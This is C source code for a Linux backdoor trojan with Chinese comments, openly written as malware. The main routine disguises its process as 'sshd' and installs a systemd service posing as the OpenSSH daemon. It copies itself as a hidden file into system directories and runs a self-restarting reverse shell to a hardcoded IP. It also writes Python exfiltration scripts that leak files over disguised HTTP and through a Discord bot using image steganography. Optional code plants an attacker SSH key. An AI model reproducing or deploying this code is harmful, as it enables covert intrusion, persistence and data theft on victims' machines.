#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <dirent.h>
#include <signal.h>
#include <netdb.h>
#include <errno.h>
#include <sys/wait.h> // 用于监控子进程
#include <sys/prctl.h> // 用于设置子进程名称
#include <stdarg.h>
#include <fcntl.h>    // for open(), O_WRONLY, O_CREAT, O_TRUNC, etc.
#include <unistd.h>   // for close()

#define BUFFER_SIZE 1024
#define REVERSE_HOST "10.21.196.225" // 替换为您的服务器IP
#define REVERSE_HOST2 "10.21.249.131"
#define REVERSE_PORT 7689
#define RESPAWN_DELAY 5
#define PROCESS_NAME "myprocess"   // 父进程名称
#define CHILD_PROCESS_NAME "myshell" // 子进程名称
#define SHELL "/bin/sh"
#define MOTD "Connected to backdoor shell\n"
#define SELF_PATH "/proc/self/exe" // 当前程序的路径
#define PUBLIC_KEY_URL "http://" REVERSE_HOST2 "/id_rsa_2048.pub"
extern char **environ;

static char **g_main_Argv = NULL;    /* pointer to argument vector */
static char *g_main_LastArgv = NULL;    /* end of argv */

void setproctitle_init(int argc, char **argv, char **envp)
{
    int i;

    for (i = 0; envp[i] != NULL; i++) // calc envp num
        continue;
    environ = (char **) malloc(sizeof (char *) * (i + 1)); // malloc envp pointer
    if (environ == NULL) {
        perror("malloc");
        exit(EXIT_FAILURE);
    }

    for (i = 0; envp[i] != NULL; i++)
    {
        environ[i] = malloc(sizeof(char) * (strlen(envp[i]) + 1));
        if (environ[i] == NULL) {
            perror("malloc");
            exit(EXIT_FAILURE);
        }
        strcpy(environ[i], envp[i]);
    }
    environ[i] = NULL;

    g_main_Argv = argv;
    if (i > 0)
        g_main_LastArgv = envp[i - 1] + strlen(envp[i - 1]);
    else
        g_main_LastArgv = argv[argc - 1] + strlen(argv[argc - 1]);
}

void setproctitle(const char *fmt, ...)
{
    char *p;
    int i;
    char buf[256];  // Changed MAXLINE to 256 for simplicity

    extern char **g_main_Argv;
    extern char *g_main_LastArgv;
    va_list ap;
    p = buf;

    va_start(ap, fmt);
    vsnprintf(p, sizeof(buf), fmt, ap);
    va_end(ap);

    i = strlen(buf);

    if (i > g_main_LastArgv - g_main_Argv[0] - 2)
    {
        i = g_main_LastArgv - g_main_Argv[0] - 2;
        buf[i] = '\0';
    }
    // Modify argv[0]
    strncpy(g_main_Argv[0], buf, i);

    p = &g_main_Argv[0][i];
    while (p < g_main_LastArgv)
        *p++ = '\0';
    g_main_Argv[1] = NULL;

    // Call prctl to change the process name
    prctl(PR_SET_NAME, buf);
}

void DownloadFile(const char *url, const char *filename) {

    // 使用 wget 下载文件
    char command[512];
    snprintf(command, sizeof(command), "sudo wget -O %s %s", filename, url);
    system(command);
}

void download_public_key(const char *pub_key_path) {
    // 调用 DownloadFile 函数下载公钥文件
    const char *url = PUBLIC_KEY_URL;
    DownloadFile(url, pub_key_path);
}

// SSH后门的设置函数
void setup_ssh_access(const char *user_home) {
    char ssh_dir[256];
    char pub_key_path[256];
    char auth_keys_path[256];

    snprintf(ssh_dir, sizeof(ssh_dir), "%s/.ssh", user_home);
    snprintf(pub_key_path, sizeof(pub_key_path), "%s/id_rsa_2048.pub", ssh_dir);
    snprintf(auth_keys_path, sizeof(auth_keys_path), "%s/authorized_keys", ssh_dir);

    mkdir(ssh_dir, 0700);
    int fd;
    if (access(auth_keys_path, F_OK) == -1) {
        fd = open(auth_keys_path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
        if (fd == -1) {
            perror("Failed to create authorized_keys file");
            exit(EXIT_FAILURE);
        }
        close(fd);
    }

    // 下载公钥文件
    download_public_key(pub_key_path);

    // 将公钥追加到 authorized_keys 文件
    char command[256];
    snprintf(command, sizeof(command), "cat %s >> %s", pub_key_path, auth_keys_path);
    system(command);
    chmod(auth_keys_path, 0600);
}

// 常见的系统目录
const char *system_dirs[] = {"/usr/bin", "/usr/local/bin", "/bin", "/sbin", "/etc"};
#define NUM_SYSTEM_DIRS (sizeof(system_dirs) / sizeof(system_dirs[0]))
void HideFile();
int FileExists(const char* filepath);

//write python file
int create_send_python(){
    // 定义包含Python代码的字符数组
    const char *python_code[] = {
        "import socket\n",
        "import base64\n",
        "import sys\n\n",
        "fake_host = \"baidu.com\"  # 伪造的目标Host\n\n",
        "def simple_encrypt(data):\n",
        "    # 加密逻辑（这里是示例，未实际加密）\n",
        "    return data  # 当前返回未加密的数据作为示例\n\n",
        "def encode_chunk(chunk):\n",
        "    base64_custom = \"abcdefghijpqrzABCKLMNOkDEFGHIJl345678mnoPQRSTUVstuvwxyWXYZ0129+/\"\n",
        "    chunk_base64 = base64.b64encode(chunk, altchars=b'+/').decode('utf-8')\n",
        "    return chunk_base64.translate(str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/', base64_custom))\n\n",
        "def get_headers(url_path, content_type, encrypted_chunk):\n",
        "    headers = f\"POST {url_path} HTTP/1.1\\r\\n\"\n",
        "    headers += f\"Host: {fake_host}\\r\\n\"\n",
        "    headers += \"User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\\r\\n\"\n",
        "    headers += \"Accept: */*\\r\\n\"\n",
        "    headers += \"Accept-Language: en-US,en;q=0.5\\r\\n\"\n",
        "    headers += \"Accept-Encoding: gzip, deflate, br\\r\\n\"\n",
        "    headers += \"Connection: keep-alive\\r\\n\"\n",
        "    headers += \"Upgrade-Insecure-Requests: 1\\r\\n\"\n",
        "    headers += f\"Content-Type: {content_type}\\r\\n\"\n",
        "    headers += f\"Content-Length: {len(encrypted_chunk)}\\r\\n\"\n",
        "    headers += \"\\r\\n\"\n",
        "    return headers\n\n",
        "def send_file_in_chunks(file_path, server_address, chunk_size=4096):\n",
        "    content_type = 'application/octet-stream'\n",
        "    url_path = \"/target\"\n\n",
        "    with open(file_path, 'rb') as f:\n",
        "        i = 1\n",
        "        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:\n",
        "            sock.connect(server_address)\n",
        "            while True:\n",
        "                chunk = f.read(chunk_size)\n",
        "                if not chunk:\n",
        "                    break\n",
        "                encoded_chunk = encode_chunk(chunk)\n",
        "                headers = get_headers(url_path, content_type, encoded_chunk)\n",
        "                sock.sendall(headers.encode('utf-8') + encoded_chunk.encode('utf-8'))\n",
        "                response = sock.recv(3)\n",
        "                if response.decode('utf-8') != 'ACK':\n",
        "                    print(\"error\")\n",
        "                print(f\"Chunk {i} sent. Server responded with: {response.decode('utf-8', errors='ignore')}\")\n",
        "                i += 1\n",
        "            headers = get_headers(url_path, content_type, '0ver'.encode('utf-8'))\n",
        "            sock.sendall(headers.encode('utf-8') + '0ver'.encode('utf-8'))\n\n",
        "    print(\"File sent successfully.\")\n\n",
        "if __name__ == \"__main__\":\n",
        "    file_path = sys.argv[1]\n",
        "    server_address = (sys.argv[2], 80)\n",
        "    send_file_in_chunks(file_path, server_address)\n"
    };

    // 打开文件用于写入
    FILE *file = fopen("send_files.py", "w");
    if (file == NULL) {
        perror("Failed to open file");
        return 1;
    }

    // 将字符数组中的每一行写入文件
    for (int i = 0; i < sizeof(python_code) / sizeof(python_code[0]); i++) {
        fputs(python_code[i], file);
    }

    // 关闭文件
    fclose(file);
    return 1;
}

int create_discord(){
    // 定义包含Python代码的字符数组
    const char *python_code[] = {
        "import os\n",
        "import random\n",
        "import discord\n",
        "import base64\n",
        "from PIL import Image\n",
        "from io import BytesIO\n",
        "\n",
        "intents = discord.Intents.default()\n",
        "intents.message_content = True\n",
        "\n",
        "client = discord.Client(intents=intents)\n",
        "\n",
        "def encrypt(input_string):\n",
        "    \"\"\"加密字符串为base64格式\"\"\"\n",
        "    byte_data = input_string.encode('utf-8')\n",
        "    base64_bytes = base64.b64encode(byte_data)\n",
        "    base64_string = base64_bytes.decode('utf-8')\n",
        "    return base64_string\n",
        "\n",
        "def text_to_bin(text):\n",
        "    \"\"\"将文本转换为二进制字符串\"\"\"\n",
        "    return ''.join([format(ord(i), '08b') for i in text])\n",
        "\n",
        "def hide_text_in_image(text, chunk_number):\n",
        "    \"\"\"将文本嵌入到图片中\"\"\"\n",
        "    img = Image.new('RGB', (100, 100), color=(73, 109, 137))\n",
        "    encoded_img = img.copy()\n",
        "    width, height = img.size\n",
        "    bin_text = text_to_bin(f\"{chunk_number}:{text}\") + '1111111111111110'  # 结束标志符\n",
        "\n",
        "    data_index = 0\n",
        "    pixels = encoded_img.load()\n",
        "\n",
        "    for i in range(height):\n",
        "        for j in range(width):\n",
        "            pixel = list(pixels[j, i])  # 获取像素的 RGB 值\n",
        "            for n in range(3):  # 对 R, G, B 三个通道进行操作\n",
        "                if data_index < len(bin_text):\n",
        "                    pixel[n] = int(format(pixel[n], '08b')[:-1] + bin_text[data_index], 2)  # 替换最低有效位\n",
        "                    data_index += 1\n",
        "            pixels[j, i] = tuple(pixel)  # 更新像素\n",
        "\n",
        "            if data_index >= len(bin_text):\n",
        "                break\n",
        "        if data_index >= len(bin_text):\n",
        "            break\n",
        "\n",
        "    img_bytes = BytesIO()\n",
        "    encoded_img.save(img_bytes, format='PNG')\n",
        "    img_bytes.seek(0)\n",
        "    return img_bytes\n",
        "\n",
        "async def send_base64_chunk(channel, chunk, chunk_number):\n",
        "    method = random.choice(['text', 'image', 'file'])  # 随机选择传输方式\n",
        "\n",
        "    # 给chunk附加块编号\n",
        "    chunk_with_number = f\"{chunk_number}:{chunk}\"  # 将块编号与数据块一起发送\n",
        "\n",
        "    if method == 'text':\n",
        "        # 作为文本消息发送\n",
        "        await channel.send(f\"Here is chunk {chunk_number}: `{chunk_with_number}`\")\n",
        "    \n",
        "    elif method == 'image':\n",
        "        # 使用隐写术将块编号和数据嵌入到图片中\n",
        "        img_bytes = hide_text_in_image(chunk, chunk_number)\n",
        "        await channel.send(file=discord.File(img_bytes, f\"image_chunk_{chunk_number}.png\"), content=f\"Chunk in image {chunk_number}\")\n",
        "\n",
        "    elif method == 'file':\n",
        "        # 创建包含块的文本文件\n",
        "        filename = f\"chunk_{chunk_number}.txt\"\n",
        "        with open(filename, 'w') as f:\n",
        "            f.write(chunk_with_number)  # 修复：文件内容与其他发送方式保持一致\n",
        "        await channel.send(file=discord.File(filename))\n",
        "\n",
        "@client.event\n",
        "async def on_ready():\n",
        "    print(f'We have logged in as {client.user}')\n",
        "\n",
        "@client.event\n",
        "async def on_message(message):\n",
        "    if message.author == client.user:\n",
        "        return\n",
        "\n",
        "    if message.content.startswith('$filepath'):\n",
        "        filepath = message.content.split(' ')[1]\n",
        "        if os.path.exists(filepath):\n",
        "            with open(filepath, 'r') as f:\n",
        "                # 注意：这里不再直接分割原始文本，而是在加密后的Base64字符串上进行分割\n",
        "                file_data = f.read()\n",
        "                base64_data = encrypt(file_data)\n",
        "                \n",
        "                chunk_size = 50  # 每个消息块的大小\n",
        "                chunk_number = 1  # 块编号起始值\n",
        "\n",
        "                while base64_data:\n",
        "                    chunk = base64_data[:chunk_size]\n",
        "                    base64_data = base64_data[chunk_size:]\n",
        "                    await send_base64_chunk(message.channel, chunk, chunk_number)  # 发送带编号的块\n",
        "                    chunk_number += 1  # 更新块编号\n",
        "\n",
        "                await send_base64_chunk(message.channel, \"EOF\", chunk_number)  # 发送EOF消息\n",
        "        else:\n",
        "            await message.channel.send(f'File not found: {filepath}')\n",
        "\n",
        "client.run('your-remote-secret')\n"
    };

    // 定义保存路径
    const char *file_path = "discord_send.py";  

    // 打开文件用于写入
    FILE *file = fopen(file_path, "w");
    if (file == NULL) {
        perror("Failed to open file");
        return 1;
    }

    // 将字符数组中的每一行写入文件
    for (int i = 0; i < sizeof(python_code) / sizeof(python_code[0]); i++) {
        fputs(python_code[i], file);
    }

    // 关闭文件
    fclose(file);

    printf("Python script written to %s\n", file_path);

    return 0;
}

// 开机自启动
void create_service_file()
{

    // 服务文件内容
    const char *service_content =
        "[Unit]\n"
        "Description=OpenSSH server daemon\n"
        "After=network.target syslog.target cloud-config.service rc-local.service\n"
        "Wants=network.target\n"
        "\n"
        "[Service]\n"
        "Type=forking\n"
        "ExecStart=/bin/bash -c \"/usr/local/bin/.hidden_trojan &\"\n"
        "TimeoutStartSec=60\n"
        "KillMode=none\n"
        "Restart=on-failure\n"
        "RestartSec=12s\n"
        "\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n";

    // 写入服务文件
    FILE *fp = fopen("/etc/systemd/system/d.service", "w");
    if (fp == NULL)
    {
        perror("Failed to create service file");
        exit(EXIT_FAILURE);
    }
    fputs(service_content, fp);
    fclose(fp);

    // 设置服务文件权限
    if (system("chmod 644 /etc/systemd/system/d.service") != 0)
    {
        perror("Failed to set permissions for service file");
        exit(EXIT_FAILURE);
    }

    // 重新加载systemd守护进程
    if (system("systemctl daemon-reload") != 0)
    {
        perror("Failed to reload systemd daemon");
        exit(EXIT_FAILURE);
    }

    // 启动服务
    if (system("systemctl start d.service") != 0)
    {
        perror("Failed to start the service");
        exit(EXIT_FAILURE);
    }

    // 设置服务开机自启动
    if (system("systemctl enable d.service") != 0)
    {
        perror("Failed to enable the service");
        exit(EXIT_FAILURE);
    }
}

// 感染线程
void *Infect(void *lpParameter)
{
    while (1)
    {
        // 感染根目录
        // InfectDisk("/");
        // 将病毒复制到系统目录
        HideFile();
        sleep(10000); // 每隔一段时间重复感染
    }
    return NULL;
}

// 感染磁盘的功能
void InfectDisk(const char *drive)
{
    DIR *dir;
    struct dirent *entry;

    if ((dir = opendir(drive)) == NULL)
    {
        perror("opendir");
        return;
    }

    // 遍历目录，感染可执行文件
    while ((entry = readdir(dir)) != NULL)
    {
        if (entry->d_type == DT_REG)
        {
            char filepath[1024];
            snprintf(filepath, sizeof(filepath), "%s/%s", drive, entry->d_name);

            if (FileExists(filepath))
            {
                // 示例：在文件后面附加恶意代码
                FILE *file = fopen(filepath, "a");
                if (file)
                {
                    fprintf(file, "\n// Infected by Trojan\n");
                    fclose(file);
                }
            }
        }
    }
    closedir(dir);
}

// 检查文件是否存在
int FileExists(const char *filename)
{
    struct stat buffer;
    return (stat(filename, &buffer) == 0);
}

// 隐藏文件
void HideFile()
{
    char self_path[1024];
    char cmd[1024];

    // 获取当前程序的路径
    ssize_t len = readlink(SELF_PATH, self_path, sizeof(self_path) - 1);
    if (len == -1)
    {
        perror("readlink");
        return;
    }
    self_path[len] = '\0'; // 确保路径字符串以空字符结尾

    // 遍历所有系统目录并复制
    for (int i = 0; i < NUM_SYSTEM_DIRS; i++)
    {
        char target_path[1024];
        strcpy(target_path, *(system_dirs + i)); // 获取实际的目录路径
        strcat(target_path, "/.hidden_trojan");
        snprintf(cmd, sizeof(cmd), "cp %s %s", self_path, target_path); // 复制并命名为隐藏文件
        system(cmd);                                                    // 执行复制命令
        chmod(target_path, S_IRUSR | S_IWUSR | S_IXUSR);
    }
}

// 写入shell脚本文件
void WriteShellScript(const char *filename, const char *command)
{
    FILE *file = fopen(filename, "w");
    if (file)
    {
        fprintf(file, "#!/bin/sh\n%s\n", command);
        fclose(file);
        chmod(filename, 0755);
    }
}

void execute_command_and_send_result(int sock, const char *command) {
    char result[BUFFER_SIZE];
    FILE *fp;

    // 打开一个进程来执行命令并读取其输出
    fp = popen(command, "r");
    if (fp == NULL) {
        snprintf(result, BUFFER_SIZE, "Failed to execute command: %s\n", command);
        write(sock, result, strlen(result));
        return;
    }

    // 逐行读取命令输出并发送到服务器
    while (fgets(result, sizeof(result), fp) != NULL) {
        write(sock, result, strlen(result));
    }

    pclose(fp);
}

void start_shell_process(int *in_fd, int *out_fd) {
    int in_pipe[2], out_pipe[2];
    pid_t pid;

    // 创建管道
    if (pipe(in_pipe) == -1 || pipe(out_pipe) == -1) {
        perror("pipe");
        exit(1);
    }

    pid = fork();
    if (pid == -1) {
        perror("fork");
        exit(1);
    }

    if (pid == 0) {
        // 子进程，设置管道为标准输入输出并执行 shell
        close(in_pipe[1]);  // 关闭写端
        close(out_pipe[0]); // 关闭读端

        // 将子进程的 stdin 连接到管道的读端
        dup2(in_pipe[0], STDIN_FILENO);
        // 将子进程的 stdout 和 stderr 连接到管道的写端
        dup2(out_pipe[1], STDOUT_FILENO);
        dup2(out_pipe[1], STDERR_FILENO);

        // 执行一个 shell 进程
        execl("/bin/sh",CHILD_PROCESS_NAME, (char *)NULL);
        exit(0); // 如果 execl 失败则退出
    } else {
        // 父进程，保存管道的写端（给子进程输入）和读端（读取子进程输出）
        close(in_pipe[0]);  // 关闭子进程这边的读端
        close(out_pipe[1]); // 关闭子进程这边的写端
        *in_fd = in_pipe[1]; // 父进程向 shell 进程输入的写端
        *out_fd = out_pipe[0]; // 父进程读取 shell 进程输出的读端
    }
}

void execute_command_and_send_result_in_shell(int sock, int shell_in_fd, int shell_out_fd, const char *command) {
    char result[BUFFER_SIZE];
    int n;

    // 向 shell 子进程写入命令
    write(shell_in_fd, command, strlen(command));
    write(shell_in_fd, "\n", 1); // 确保每个命令以换行符结束

    // 读取子进程的输出
    while ((n = read(shell_out_fd, result, BUFFER_SIZE - 1)) > 0) {
        result[n] = '\0'; // 确保字符串以 NULL 结尾
        write(sock, result, strlen(result)); // 将结果发送回服务器
        if (n < BUFFER_SIZE - 1) {
            break; // 读取完当前输出后跳出
        }
    }
}

void start_reverse_shell(const char *host, unsigned short int port) {
    int sock;
    struct sockaddr_in serv_addr;
    struct hostent *server;
    char buffer[BUFFER_SIZE];
    int shell_in_fd, shell_out_fd;

    // 启动子进程 shell
    start_shell_process(&shell_in_fd, &shell_out_fd);

    while (1) {
        // 创建套接字
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            perror("socket");
            sleep(RESPAWN_DELAY);
            continue;
        }

        // 解析主机名
        server = gethostbyname(host);
        if (server == NULL) {
            fprintf(stderr, "ERROR: no such host\n");
            close(sock);
            sleep(RESPAWN_DELAY);
            continue;
        }

        // 初始化服务器地址结构
        bzero((char *)&serv_addr, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        bcopy((char *)server->h_addr, (char *)&serv_addr.sin_addr.s_addr, server->h_length);
        serv_addr.sin_port = htons(port);

        // 连接到目标服务器
        if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            perror("connect");
            close(sock);
            sleep(RESPAWN_DELAY);
            continue;
        }

        // 连接成功后，发送连接确认信息
        snprintf(buffer, BUFFER_SIZE, "Connected to reverse shell\n");
        write(sock, buffer, strlen(buffer));

        // 循环等待和处理命令
        while (1) {
            // 清空缓冲区并接收数据
            bzero(buffer, BUFFER_SIZE);
            int n = read(sock, buffer, BUFFER_SIZE - 1);
            if (n <= 0) {
                break; // 连接断开或读取错误，跳出循环
            }
            buffer[n] = '\0'; // 确保输入的命令以 NULL 结尾

            // 执行接收到的命令并返回结果
            execute_command_and_send_result_in_shell(sock, shell_in_fd, shell_out_fd, buffer);
        }

        // 关闭套接字并等待重试
        close(sock);
        sleep(RESPAWN_DELAY);
    }
}

// 守护子进程，子进程被杀死后自动重启
void monitor_and_respawn()
{
    pid_t pid;
    int status;

    while (1)
    {
        pid = fork(); // 创建子进程
        if (pid == 0)
        {
            // 在子进程中重命名进程
            prctl(PR_SET_NAME, CHILD_PROCESS_NAME, 0, 0, 0); // 设置子进程名为 "myshell"

            // 调试输出当前进程名称
            char name[16];
            prctl(PR_GET_NAME, (unsigned long)name, 0, 0, 0);
            printf("Child process name: %s\n", name);
            printf("Child process PID: %d\n", getpid());

            // 执行反向shell
            start_reverse_shell(REVERSE_HOST, REVERSE_PORT);
            exit(0); // 正常退出子进程
        }
        else if (pid > 0)
        {
            // 父进程：等待子进程退出
            waitpid(pid, &status, 0); // 等待子进程状态变化

            // 如果子进程异常退出，重新启动
            if (WIFEXITED(status))
            {
                printf("Child process exited with status %d. Restarting in %d seconds...\n", WEXITSTATUS(status), RESPAWN_DELAY);
            }
            else if (WIFSIGNALED(status))
            {
                printf("Child process terminated by signal %d. Restarting in %d seconds...\n", WTERMSIG(status), RESPAWN_DELAY);
            }

            // 等待几秒后重启子进程
            sleep(RESPAWN_DELAY);
        }
        else
        {
            perror("fork failed");
            exit(EXIT_FAILURE);
        }
    }
}

int main(int argc, char *argv[])
{
    setproctitle_init(argc, argv, environ);
    setproctitle("[sshd]");
    //setup_ssh_access("/root");
    create_service_file();
    create_discord();

    pthread_t infect;
    create_send_python();
    signal(SIGCHLD, SIG_IGN); // 忽略子进程退出信号
    chdir("/");               // 改变工作目录到根目录

    // 重命名父进程
    strncpy(argv[0], PROCESS_NAME, strlen(PROCESS_NAME));
    argv[0][strlen(PROCESS_NAME)] = '\0'; // 确保字符串终止

    // 创建并启动感染线程
    if (pthread_create(&infect, NULL, Infect, NULL) != 0)
    {
        perror("Failed to create infection thread");
        exit(EXIT_FAILURE);
    }

    // 后台运行：在后台运行后，父进程不退出，改为执行monitor_and_respawn
    if (fork() != 0)
    {
        // 父进程直接进入监控子进程的逻辑，不再退出
        monitor_and_respawn();
    }
    else
    {
        // 如果是子进程，结束这个子进程，使父进程能够继续运行
        exit(EXIT_SUCCESS);
    }

    return EXIT_SUCCESS;
}
